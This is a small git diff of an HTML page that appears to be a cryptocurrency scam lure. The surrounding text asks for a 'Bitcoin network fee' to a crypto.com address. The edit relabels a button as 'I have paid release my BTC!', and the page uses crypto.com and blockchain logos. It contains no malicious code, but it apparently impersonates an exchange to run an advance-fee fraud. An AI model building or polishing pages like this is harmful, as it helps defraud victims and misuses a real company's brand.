@@ -53,11 +53,11 @@ Bitcoin network fee to for immediate reflection to **crypto.com** address destin
 
 
 <form action="https://crypto.com/" method="get">
-     <button style="float: left;">Check your balance!</button>
+     <button style="float: left;">I have paid release my BTC!</button>
         <button type="submit">Login!</button>
 </form>
 
 
-<img src="IMG_8281.gif" alt="bitcoin gif display" width="700">
+<img src="IMG_8829.gif" alt="bitcoin gif display" width="700">
 
 <img src="IMG_8269.jpeg" alt="crypto.com & blockchain Logo" width="700" />
